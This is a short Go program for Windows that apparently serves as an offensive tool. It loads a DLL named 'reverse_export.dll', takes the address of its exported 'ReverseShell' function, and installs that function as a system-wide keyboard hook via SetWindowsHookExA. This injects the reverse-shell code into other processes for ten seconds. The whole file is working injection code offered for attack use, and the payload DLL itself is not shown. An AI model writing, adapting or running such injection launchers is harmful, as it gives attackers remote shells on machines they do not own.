package main

import (
	"fmt"
	"log"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

func main() {

	var (
		dllToLoad           = "reverse_export.dll" // Put somewhere in Windows DLL load path
		user32DLL           = windows.NewLazyDLL("User32.dll")
		setWindowsHookEx    = user32DLL.NewProc("SetWindowsHookExA")
		unhookWindowsHookEx = user32DLL.NewProc("UnhookWindowsHookEx")
	)

	targetDll, err := windows.LoadLibrary(dllToLoad)
	if err != nil {
		log.Fatal("[-] Failed to load DLL")
	}
	fmt.Println("[+] DLL loaded")
	shellFunc, err := windows.GetProcAddress(targetDll, "ReverseShell")
	if err != nil {
		log.Fatal("[-] Failed to get reverse shell function address")
	}
	fmt.Println("[+] Got reverse shell function address")

	r1, _, _ := setWindowsHookEx.Call(
		2,
		uintptr(unsafe.Pointer(shellFunc)),
		uintptr(unsafe.Pointer(targetDll)),
		0,
	)
	if r1 == 0 {
		log.Fatal("[-] Failed to set hook")
	}
	fmt.Println("[+] Successfully set hook")

	time.Sleep(10 * time.Second)

	unhookWindowsHookEx.Call(r1)

}
